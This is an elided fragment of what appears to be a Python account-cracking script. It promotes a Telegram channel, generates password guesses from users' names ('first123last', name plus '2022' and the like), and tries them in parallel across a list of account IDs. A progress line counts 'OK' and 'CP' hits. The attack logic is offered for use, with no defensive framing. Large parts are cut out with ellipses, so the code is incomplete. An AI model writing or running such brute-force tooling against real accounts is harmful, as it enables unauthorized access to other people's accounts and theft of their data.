...
def rajy():
    try:
        na = webbrowser.open('https://t.me/N_9_N_6')
    except:
        exit()
    ...
    with tred(max_workers=30) as pool:
        for yuzong in id2:
            ...
            if len(nmf) < 6:
                ...
                pwv.append(frs+'2022')
                pwv.append(frs+'112233')
                pwv.append('123first123')
                pwv.append('1234first1234')
                pwv.append('12345first12345')
                pwv.append('first12last')
                pwv.append('first123last')
                pwv.append('first1234last')
                pwv.append('first12345last')
...
def crack(idf, pwv):
    ...
    print(f'''\r\n\033[92m[DEC BY DEMO] %s{ya}[ᖇᗩᒍY] %s/%s ➙ [OK]=%s ➙[CP]=%s | %s%s%s{ya}''' % (bi, loop, len(id2), ok, cp, int(pers), str(fff), x), end=' ')
    sys.stdout.flush()
